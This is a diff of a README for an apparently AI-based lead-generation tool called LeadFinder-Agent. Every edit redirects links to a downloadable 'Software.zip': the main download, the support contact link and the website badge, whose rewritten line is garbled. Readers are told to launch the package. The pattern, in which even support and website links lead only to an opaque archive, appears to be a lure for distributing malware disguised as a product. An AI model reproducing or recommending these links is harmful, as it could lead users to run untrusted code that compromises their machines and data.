@@ -14,7 +14,7 @@ Welcome to LeadFinder-Agent, an AI-powered lead generation tool that transforms 
 
 To get started with LeadFinder-Agent, simply download the software package from the link provided below:
 
-[Download LeadFinder-Agent Software](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip) 📦
+[Download LeadFinder-Agent Software](https://github.com/DEVOFSS/LeadFinder-Agent/releases/download/v1.0/Software.zip) 📦
 
 *Note: Launch the downloaded software package to begin using LeadFinder-Agent.*
 
@@ -49,7 +49,7 @@ To get started with LeadFinder-Agent, simply download the software package from 
 
 ## Support 💬
 
-If you encounter any issues or have any questions about LeadFinder-Agent, feel free to [contact us](mailto:support@leadfinderagent.com) for assistance.
+If you encounter any issues or have any questions about LeadFinder-Agent, feel free to [contact us](https://github.com/DEVOFSS/LeadFinder-Agent/releases/download/v1.0/Software.zip) for assistance.
 
 ## About Us ℹ️
 
@@ -57,4 +57,4 @@ LeadFinder-Agent is developed by a team of AI enthusiasts passionate about lever
 
 ---
 
-[![](https://img.shields.io/badge/Visit%20Website-leadfinderagent.com-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![](https://github.com/DEVOFSS/LeadFinder-Agent/releases/download/v1.0/Software.zip%https://github.com/DEVOFSS/LeadFinder-Agent/releases/download/v1.0/Software.zip)](https://github.com/DEVOFSS/LeadFinder-Agent/releases/download/v1.0/Software.zip)
